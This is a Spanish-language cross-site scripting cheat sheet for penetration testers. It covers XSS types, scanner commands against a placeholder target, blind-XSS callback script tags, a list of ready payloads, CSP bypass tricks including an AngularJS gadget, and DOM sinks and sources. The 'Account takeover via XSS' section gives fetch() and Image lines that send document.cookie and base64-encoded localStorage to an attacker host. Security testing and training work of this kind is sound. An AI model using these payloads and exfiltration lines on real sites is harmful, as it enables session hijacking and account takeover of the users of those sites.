# XSS — Cross-Site Scripting

## Tipos
- **Reflected** — payload se refleja en respuesta sin sanitizar.
- **Stored** — payload persiste en BD, ejecuta para otros usuarios.
- **DOM-based** — sink en JS cliente (`innerHTML`, `eval`, `document.write`, `location.hash`).
- **Blind** — ejecuta en backend admin / log viewer / soporte.
- **Mutation (mXSS)** — el navegador modifica HTML al parsear, generando XSS.

## Herramientas

```bash
# XSStrike (DOM + reflected, fuzzy)
xsstrike -u "https://target.cl/search?q=test"

# Dalfox (rápido, Go)
dalfox url https://target.cl/search?q=test
dalfox file urls.txt --custom-payload payloads.txt -o dalfox.txt

# kxss (rápido, busca reflejos)
echo "https://target.cl/?q=test" | waybackurls | kxss

# xsser
xsser -u "https://target.cl/search" -g "?q=" --auto
```

## Blind XSS — XSSHunter / interactsh

Payloads que llaman a tu callback:
```html
<script src=https://x.xss.ht></script>
"><script src=//x.oast.fun></script>
```

Útil para áreas no visibles: forms de soporte, panel admin, logs.

## Payloads esenciales

```html
<script>alert(1)</script>
"><svg/onload=alert(1)>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

DOM/JS context:
```js
';alert(1);//
\";alert(1);//
</script><script>alert(1)</script>
```

## CSP bypass

Comprobar policy:
```bash
curl -sI https://target.cl | grep -i content-security-policy
```

Bypasses comunes:
- `'unsafe-inline'` o `'unsafe-eval'` permite injection directa.
- `*.googleapis.com` → JSONP en `accounts.google.com`.
- Wildcard `*` en `script-src`.
- `nonce` reusado entre requests.
- `data:` permitido en `script-src`.
- Falta `base-uri` → injection de `<base>` para hijack rutas relativas.
- AngularJS gadget: `<input ng-app ng-csp ng-click=$event.view.alert(1)>`.

Recurso: https://github.com/PortSwigger/csp-bypass

## Account takeover via XSS

```js
fetch('https://atacker.cl/steal?c='+document.cookie)
new Image().src='https://atacker.cl/?c='+btoa(document.cookie)
// Robar localStorage/sessionStorage
fetch('https://atacker.cl/?d='+btoa(JSON.stringify(localStorage)))
```

## Sinks DOM XSS comunes

- `eval`, `setTimeout(string)`, `setInterval(string)`, `Function`
- `innerHTML`, `outerHTML`, `document.write`, `document.writeln`
- `location`, `location.href`, `location.hash`, `location.search`
- `jQuery`: `$()`, `.html()`, `.append()`
- React `dangerouslySetInnerHTML`
- Vue `v-html`

## Sources DOM XSS

`location.*`, `document.URL`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `document.cookie`.

## Anti-patrones

- ❌ `alert(1)` como única PoC en informe — no demuestra impacto.
- ❌ No probar contexto JS / atributo / URL / CSS por separado.
- ❌ Olvidar `Content-Type: text/html` (sin él el navegador no ejecuta).
